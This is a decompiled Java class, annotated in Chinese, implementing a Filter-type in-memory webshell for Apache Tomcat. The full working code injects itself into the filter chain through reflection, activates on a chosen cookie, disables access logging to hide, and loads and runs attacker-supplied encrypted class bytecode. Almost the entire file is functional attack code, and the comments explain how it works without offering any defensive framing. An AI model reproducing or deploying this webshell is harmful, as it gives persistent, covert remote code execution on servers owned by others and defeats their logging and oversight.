// Source code is decompiled from a .class file using FernFlower decompiler.
// 这是一个Java内存马（Filter型），通过动态注册Filter来持久化。
// 主要功能包括：AES加密通信、动态类加载、通过反射修改Tomcat服务器配置以隐藏自身。
package f; // 原始包名，反编译所得

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.PageContext;

// 类继承了ClassLoader，使其具备动态加载Class字节码的能力。
// 同时实现了Filter, Servlet, ServletConfig接口，使其可以被注入为Filter或Servlet。
public class FILTER extends ClassLoader implements Filter, Servlet, ServletConfig {
   // 静态FilterConfig，可能用于在不同实例间共享配置
   private static FilterConfig filterConfig;
   // 自定义的Base64字符集
   public final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
   // 用于接收加密数据的HTTP参数名
   private String param;
   // 用于触发内存马逻辑的Cookie键名
   private String ck_name;
   // AES加密的密钥
   private String secretKey;
   // Filter映射的URL路径
   private String path;

   // 用于在不同方法间传递参数的Map
   private HashMap parameterMap;
   // Servlet配置对象
   private ServletConfig servletConfig;
   // Servlet上下文对象
   private ServletContext servletContext;
   // JSP工厂实例
   private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();

   /**
    * @param b class文件的字节码
    * @return 加载后的Class对象
    * 使用ClassLoader的defineClass方法，从字节数组中定义一个类。这是动态加载恶意功能的核心。
    */
   public Class Q(byte[] b) {
      return super.defineClass(b, 0, b.length);
   }

   // 默认构造函数
   public FILTER() {
   }

   // 带ClassLoader的构造函数
   public FILTER(ClassLoader loader) {
      super(loader);
   }

   /**
    * 这是一个被重载的equals方法，但其实现与常规的equals完全不同。
    * 它被用作一个初始化方法，通过传入一个HashMap来设置内存马的各种参数。
    * 这种技巧常用于漏洞利用，当攻击者可以控制对象并调用其方法时，通过调用equals来执行代码。
    * @param obj 预期是一个包含配置信息的HashMap
    * @return 如果初始化成功返回true，否则返回false
    */
   public boolean equals(Object obj) {
      try {
         this.parameterMap = (HashMap)obj;
         this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
         this.param = this.get("param");
         this.ck_name = this.get("ck_name");
         this.secretKey = this.get("secretKey");
         this.path = this.get("path");
         return true;
      } catch (Exception var3) {
         return false;
      }
   }

   /**
    * 这同样是一个被滥用的方法。它并非返回对象的字符串表示，
    * 而是触发核心的Filter注入逻辑。它调用addFilter方法将自身注册为Web应用的一个Filter。
    * @return 返回空字符串
    */
   public String toString() {
      // 调用addFilter，尝试将自身注入为Filter，并将结果放入parameterMap
      this.parameterMap.put("result", this.addFilter(this, this.getStandardContext()).getBytes());
      this.parameterMap = null; // 清理
      return "";
   }
   
   // --- Servlet/Filter 接口的实现 ---
   // 这些方法大多是空的，因为核心逻辑在其他地方，但它们是实现接口所必需的。

   public void init(ServletConfig servletConfig) throws ServletException {
   }

   public ServletConfig getServletConfig() {
      return this;
   }

   public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
   }

   public String getServletInfo() {
      return this.getServletName();
   }

   public void destroy() {
   }

       /**
     * Filter的核心方法。
     * 检查请求中是否有名为 JSESSIONID 的Cookie，并且其值包含期望的cookie标识。
     * 如果Cookie值包含this.ck，则调用_jspService方法，执行主要的恶意逻辑。
     * 如果不包含，则正常处理请求，调用下一个Filter。
     */
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
       try {
          HttpServletRequest httpServletRequest = (HttpServletRequest)req;
          HttpServletResponse httpServletResponse = (HttpServletResponse)resp;
          Cookie[] cookies = httpServletRequest.getCookies();

          if (cookies != null) {
              for(int i = 0; i < cookies.length; ++i) {
                 Cookie cookie = cookies[i];
                 // 检查cookie名为JSESSIONID且值包含期望的标识
                 if (this.ck_name.equals(cookie.getName())) {
                    // 找到触发Cookie，执行payload
                    this._jspService(httpServletRequest, httpServletResponse);
                    return; // 终止请求链
                 }
              }
          }
       } catch (Exception var10) {
          // 忽略异常
       }

       // 没有触发，则正常执行
       chain.doFilter(req, resp);
    }
    
   public void init(FilterConfig config) throws ServletException {
      filterConfig = config;
   }

   public String getServletName() {
      return "Servlet";
   }

   public ServletContext getServletContext() {
      return filterConfig.getServletContext();
   }

   public String getInitParameter(String s) {
      return s;
   }

   public Enumeration<String> getInitParameterNames() {
      return null;
   }

   // XOR加密/解密（用于第一阶段加载）
  public byte[] x(byte[] s, String key) {
    if (key == null || key.isEmpty()) {
        return null; // 没有密钥，解密失败
    }
    try {
        byte[] keyBytes = key.getBytes("UTF-8");
        byte[] result = new byte[s.length];
        for (int i = 0; i < s.length; i++) {
            result[i] = (byte) (s[i] ^ keyBytes[i % keyBytes.length]);
        }
        return result;
    } catch (Exception e) {
        return null;
    }
}

   /**
    * MD5哈希计算
    * @param s 输入字符串
    * @return MD5哈希值的大写形式
    */
   public static String md5(String s) {
      String ret = null;

      try {
         MessageDigest m = MessageDigest.getInstance("MD5");
         m.update(s.getBytes(), 0, s.length());
         ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
      } catch (Exception var3) {
      }

      return ret;
   }

   /**
    * 反射工具：调用对象的方法
    * @param obj 目标对象
    * @param methodName 方法名
    * @param parameters 方法参数
    * @return 方法返回值
    */
   private Object invoke(Object obj, String methodName, Object... parameters) {
      try {
         ArrayList<Class<?>> classes = new ArrayList<>();
         if (parameters != null) {
            for(int i = 0; i < parameters.length; ++i) {
               Object o1 = parameters[i];
               if (o1 != null) {
                  classes.add(o1.getClass());
               } else {
                  classes.add((Class<?>)null);
               }
            }
         }

         Method method = this.getMethodByClass(obj.getClass(), methodName, classes.toArray(new Class[0]));
         return method.invoke(obj, parameters);
      } catch (Exception var7) {
         return null;
      }
   }

   /**
    * 通过反射获取Tomcat的StandardContext对象。
    * 这是注入Filter的关键，因为需要操作Tomcat的内部API。
    * @return StandardContext对象，如果失败则返回null
    */
   private Object getStandardContext() {
      try {
         // this.servletContext.get("context").get("context")
         return getFieldValue(getFieldValue(this.servletContext, "context"), "context");
      } catch (Exception var2) {
         return null;
      }
   }

   /**
    * 动态添加Filter到Web容器中。
    * @param filter 要添加的Filter实例
    * @param standardContext Tomcat的StandardContext对象
    * @return "ok"表示成功，否则返回错误信息
    */
   protected String addFilter(Filter filter, Object standardContext) {
      try {
         // 生成一个唯一的Filter名
         String filterName = filter.getClass().getSimpleName() + System.currentTimeMillis();
         Class<?> standardContextClass = standardContext.getClass();
         ClassLoader standardContextClassLoader = standardContextClass.getClassLoader();

         // 通过反射创建FilterMap和FilterDef对象 (Tomcat私有API)
         Object filterMap = this.getMethodParameterTypes(standardContextClass, "addFilterMap")[0].newInstance();
         Object filterDef = this.getMethodParameterTypes(standardContextClass, "addFilterDef")[0].newInstance();
         
         // 设置Filter的URL映射，默认为"/*"
         //String urlPattern = (this.path == null || this.path.trim().isEmpty()) ? "/*" : this.path;
         String urlPattern = this.path;
         
         // 配置FilterMap和FilterDef
         this.invoke(filterMap, "setURLPattern", urlPattern);
         this.invoke(filterMap, "addURLPattern", urlPattern);
         this.invoke(filterMap, "setFilterName", filterName);
         this.invoke(filterDef, "setFilterName", filterName);
         // 临时设置一个存在的Filter类，避免检查失败
         this.invoke(filterDef, "setFilterClass", "org.apache.catalina.filters.SetCharacterEncodingFilter");

         // 创建并配置ApplicationFilterConfig
         Constructor<?> applicationFilterConfigConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", false, standardContextClassLoader).getDeclaredConstructor(Class.forName("org.apache.catalina.Context", false, standardContextClassLoader), filterDef.getClass());
         applicationFilterConfigConstructor.setAccessible(true);
         Object applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);

         // 将我们自己的Filter实例设置进去
         setFieldValue(applicationFilterConfig, "filter", filter);
         // 将Filter类名改回我们自己的类
         this.invoke(filterDef, "setFilterClass", filter.getClass().getName());
         
         // 初始化Filter
         filter.init((FilterConfig)applicationFilterConfig);
         
         // 将FilterDef和FilterMap添加到StandardContext中
         this.invoke(standardContext, "addFilterDef", filterDef);
         this.invoke(standardContext, "addFilterMap", filterMap);
         
         // 将FilterConfig也注册到StandardContext中
         HashMap<String, Object> filterConfigs = (HashMap)getFieldValue(standardContext, "filterConfigs");
         filterConfigs.put(filterName, applicationFilterConfig);
         
         // --- 调整Filter链顺序，将我们的Filter移动到最前面 ---
         Object[] filterMaps = (Object[])this.invoke(standardContext, "findFilterMaps", (Object[])null);
         if (filterMaps.length > 1) {
            Object[] tmpFilterMaps = new Object[filterMaps.length];
            int index = 1;

            int i;
            for(i = 0; i < filterMaps.length; ++i) {
               Object _filterMap = filterMaps[i];
               if (filterName.equals(this.invoke(_filterMap, "getFilterName", (Object[])null))) {
                  tmpFilterMaps[0] = _filterMap; // 我们的Filter放在第一位
               } else {
                  tmpFilterMaps[index++] = filterMaps[i];
               }
            }
            
            for(i = 0; i < filterMaps.length; ++i) {
               filterMaps[i] = tmpFilterMaps[i];
            }
         }

         return "ok"+ "|" + filterName + "|" + urlPattern;
      } catch (Exception var16) {
         return var16.getMessage();
      }
   }

   /**
    * 反射工具：设置对象的字段值
    */
   public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
      Field f = null;
      if (obj instanceof Field) {
         f = (Field)obj;
      } else {
         f = obj.getClass().getDeclaredField(fieldName);
      }

      f.setAccessible(true);
      f.set(obj, value);
   }

   /**
    * 反射工具：获取方法的参数类型
    */
   private Class[] getMethodParameterTypes(Class cls, String methodName) {
      Method[] methods = cls.getDeclaredMethods();

      for(int i = 0; i < methods.length; ++i) {
         if (methodName.equals(methods[i].getName())) {
            return methods[i].getParameterTypes();
         }
      }

      return null;
   }

   /**
    * 反射工具：根据方法名和参数类型获取Method对象，会递归查找父类
    */
   private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
      Method method = null;

      while(cs != null) {
         try {
            method = cs.getDeclaredMethod(methodName, parameters);
            cs = null; // 找到后退出循环
         } catch (Exception var6) {
            cs = cs.getSuperclass(); // 在父类中继续查找
         }
      }

      return method;
   }

   /**
    * 反射工具：获取对象的字段值，会递归查找父类
    */
   public static Object getFieldValue(Object obj, String fieldName) throws Exception {
      Field f = null;
      if (obj instanceof Field) {
         f = (Field)obj;
      } else {
         Method method = null;
         Class cs = obj.getClass();

         while(cs != null) {
            try {
               f = cs.getDeclaredField(fieldName);
               cs = null; // 找到后退出
            } catch (Exception var6) {
               cs = cs.getSuperclass(); // 在父类中继续查找
            }
         }
      }

      f.setAccessible(true);
      return f.get(obj);
   }

   /**
    * 尝试禁用Tomcat的访问日志（AccessLog）。
    * 通过反射遍历Tomcat的Pipeline中的Valve，找到AccessLogValve，
    * 并修改其condition，使其不再记录日志。
    * @param pc PageContext
    */
   private void noLog(PageContext pc) {
      try {
         Object applicationContext = getFieldValue(pc.getServletContext(), "context");
         Object container = getFieldValue(applicationContext, "context");

         // 遍历容器层级 (Context -> Host -> Engine)
         ArrayList<Object> arrayList = new ArrayList<>();
         for(; container != null; container = this.invoke(container, "getParent", (Object[])null)) {
            arrayList.add(container);
         }

         label51:
         for(int i = 0; i < arrayList.size(); ++i) {
            try {
               Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[])null);
               if (pipeline != null) {
                  Object valve = this.invoke(pipeline, "getFirst", (Object[])null);

                  while(true) {
                     while(true) {
                        if (valve == null) {
                           continue label51; // 处理下一个container
                        }

                        // 寻找带有get/setCondition方法的Valve (通常是AccessLogValve)
                        if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null && this.getMethodByClass(valve.getClass(), "setCondition", String.class) != null) {
                           String condition = (String)this.invoke(valve, "getCondition");
                           condition = condition == null ? "FuckLog" : condition; // 使用一个不可能为true的条件
                           this.invoke(valve, "setCondition", condition);
                           pc.getRequest().setAttribute(condition, condition);
                           valve = this.invoke(valve, "getNext", (Object[])null);
                        } else if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                           // 如果不是目标Valve，则继续遍历下一个
                           valve = this.invoke(valve, "getNext", (Object[])null);
                        } else {
                           valve = null;
                        }
                     }
                  }
               }
            } catch (Exception var9) {
            }
         }
      } catch (Exception var10) {
      }

   }

   // SHA256哈希计算
   public static String sha256(String s) {
      try {
          java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
          byte[] hash = md.digest(s.getBytes("UTF-8"));
          StringBuilder hexString = new StringBuilder();
          for (byte b : hash) {
              String hex = Integer.toHexString(0xff & b);
              if (hex.length() == 1) {
                  hexString.append('0');
              }
              hexString.append(hex);
          }
          return hexString.toString().toUpperCase();
      } catch (Exception e) {
          return null;
      }
  }

    // ===== 动态标记生成 =====
    // 根据时间戳和密钥生成动态标记
    public String[] generateDynamicMarkers(long timestamp, String secretKey,String param) {
      try {
          // 将时间戳转换为分钟级别（减少时间敏感性）
          long timeWindow = timestamp / (60 * 1000); // 1分钟窗口
          
          // 生成用于标记的种子 - 使用参数名+密钥+时间窗口
          String seed = param + secretKey + timeWindow;
          String hash = sha256(seed);
          
          // 生成左标记：使用参数名+时间窗口的SHA256哈希（确保动态变化）
          String leftSeed = param + timeWindow;
          String leftHash = sha256(leftSeed);
          String leftMarker = leftHash.substring(0, 12);
          
          // 生成右标记：使用SHA256的前12位
          String rightMarker = hash.substring(0, 12);
          
          return new String[]{leftMarker, rightMarker};
      } catch (Exception e) {
          // 降级到固定标记
          try {
              String fallbackSeed = param + secretKey;
              String fallbackHash = sha256(fallbackSeed);
              String fallbackLeftHash = sha256(fallbackSeed);
              
              String leftMarker = fallbackLeftHash.substring(0, 12);
              String rightMarker = fallbackHash.substring(0, 12);
              
              return new String[]{leftMarker, rightMarker};
          } catch (Exception ex) {
              // 最终降级
              return new String[]{"STARTDATA", "ENDDATA"};
          }
      }
  }

   /**
    * 内存马的核心业务逻辑。在被doFilter触发后调用。
    * 实现了两阶段加载：
    * 1. 第一个请求，将payload（一个class的字节码）加载到内存中，并存入Session。
    * 2. 后续请求，从Session中取出加载的Class，创建实例并执行。
    * @param request HttpServletRequest
    * @param response HttpServletResponse
    */
    public void _jspService(HttpServletRequest request, HttpServletResponse response) throws Exception {
      HttpSession session = null;
      JspWriter out = null;
      PageContext _jspx_page_context = null;

      try {
         response.setContentType("text/html");
         response.setCharacterEncoding("utf-8");
         
         PageContext pageContext = _jspxFactory.getPageContext(this, request, response, (String)null, true, 8192, true);
         session = pageContext.getSession();
         //out = pageContext.getOut();
         
         // 尝试禁用访问日志
         this.noLog(pageContext);
      
         try {
            // 如果是首次连接，加载客户端发来的主payload
            if (session.getAttribute("payload") == null) {
               // 读取请求体内容（客户端直接发送base64编码的加密数据）
               byte[] data = base64Decode(request.getParameter(this.param));
               if (data == null) {
                     response.getWriter().write("DEBUG ERROR: Base64解码失败");
                     return;
               }

               // 从cookie中获取密钥
               Cookie[] cookies = request.getCookies();
               for(int i = 0; i < cookies.length; ++i) {
                  Cookie cookie = cookies[i];
                  if (this.ck_name.equals(cookie.getName())) {
                        data = x(data, cookie.getValue());
                        break;
                  }
               }

               session.setAttribute("payload", (new FILTER(pageContext.getClass().getClassLoader())).Q(data));
               response.getWriter().write("[DEBUG] Payload加载成功！");
               
            } else { 
               java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
               Object f = ((Class)session.getAttribute("payload")).newInstance();
               // 传递必要的对象（让payload自己从request中获取并解密数据）
               f.equals(arrOut);
               f.equals(pageContext);
               
               // 调用toString()来执行并直接输出响应
               f.toString();
            }
         } catch (Exception var19) {}
      } catch (Exception var20) {
      } finally {
         _jspxFactory.releasePageContext(_jspx_page_context);
      }

        
      
     }

   // --- 自定义Base64实现 ---
   // 可能是为了避免依赖，或绕过对标准Base64库函数的检测
   public String base64Encode(String data) {
      return this.base64Encode(data.getBytes());
   }

   public String base64Encode(byte[] src) {
      int off = 0;
      int end = src.length;
      byte[] dst = new byte[4 * ((src.length + 2) / 3)];
      int linemax = -1;
      boolean doPadding = true;
      char[] base64 = this.toBase64;
      int sp = off;
      int slen = (end - off) / 3 * 3;
      int sl = off + slen;
      if (linemax > 0 && slen > linemax / 4 * 3) {
         slen = linemax / 4 * 3;
      }

      int dp;
      int b0;
      int b1;
      for(dp = 0; sp < sl; sp = b0) {
         b0 = Math.min(sp + slen, sl);
         b1 = sp;

         int bits;
         for(int dp0 = dp; b1 < b0; dst[dp0++] = (byte)base64[bits & 63]) {
            bits = (src[b1++] & 255) << 16 | (src[b1++] & 255) << 8 | src[b1++] & 255;
            dst[dp0++] = (byte)base64[bits >>> 18 & 63];
            dst[dp0++] = (byte)base64[bits >>> 12 & 63];
            dst[dp0++] = (byte)base64[bits >>> 6 & 63];
         }

         b1 = (b0 - sp) / 3 * 4;
         dp += b1;
      }

      if (sp < end) {
         b0 = src[sp++] & 255;
         dst[dp++] = (byte)base64[b0 >> 2];
         if (sp == end) {
            dst[dp++] = (byte)base64[b0 << 4 & 63];
            if (doPadding) {
               dst[dp++] = 61;
               dst[dp++] = 61;
            }
         } else {
            b1 = src[sp++] & 255;
            dst[dp++] = (byte)base64[b0 << 4 & 63 | b1 >> 4];
            dst[dp++] = (byte)base64[b1 << 2 & 63];
            if (doPadding) {
               dst[dp++] = 61;
            }
         }
      }

      return new String(dst);
   }

   public byte[] base64Decode(String base64Str) {
      if (base64Str.length() == 0) {
         return new byte[0];
      } else {
         byte[] src = base64Str.getBytes();
         int sp = 0;
         int sl = src.length;
         int paddings = 0;
         int len = sl - sp;
         if (src[sl - 1] == 61) {
            ++paddings;
            if (src[sl - 2] == 61) {
               ++paddings;
            }
         }

         if (paddings == 0 && (len & 3) != 0) {
            paddings = 4 - (len & 3);
         }

         byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
         int[] base64 = new int[256];
         Arrays.fill(base64, -1);

         int dp;
         for(dp = 0; dp < this.toBase64.length; base64[this.toBase64[dp]] = dp++) {
         }

         base64[61] = -2;
         dp = 0;
         int bits = 0;
         int shiftto = 18;

         while(sp < sl) {
            int b = src[sp++] & 255;
            if ((b = base64[b]) < 0 && b == -2) {
               if (shiftto == 6 && (sp == sl || src[sp++] != 61) || shiftto == 18) {
                  throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
               }
               break;
            }

            bits |= b << shiftto;
            shiftto -= 6;
            if (shiftto < 0) {
               dst[dp++] = (byte)(bits >> 16);
               dst[dp++] = (byte)(bits >> 8);
               dst[dp++] = (byte)bits;
               shiftto = 18;
               bits = 0;
            }
         }

         if (shiftto == 6) {
            dst[dp++] = (byte)(bits >> 16);
         } else if (shiftto == 0) {
            dst[dp++] = (byte)(bits >> 16);
            dst[dp++] = (byte)(bits >> 8);
         } else if (shiftto == 12) {
            throw new IllegalArgumentException("Last unit does not have enough valid bits");
         }

         if (dp != dst.length) {
            byte[] arrayOfByte = new byte[dp];
            System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
            dst = arrayOfByte;
         }

         return dst;
      }
   }

   /**
    * 从parameterMap中获取参数值的辅助方法。
    * @param key 键
    * @return 字符串形式的值
    */
   public String get(String key) {
      try {
         return new String((byte[])this.parameterMap.get(key));
      } catch (Exception var3) {
         return null;
      }
   }
}
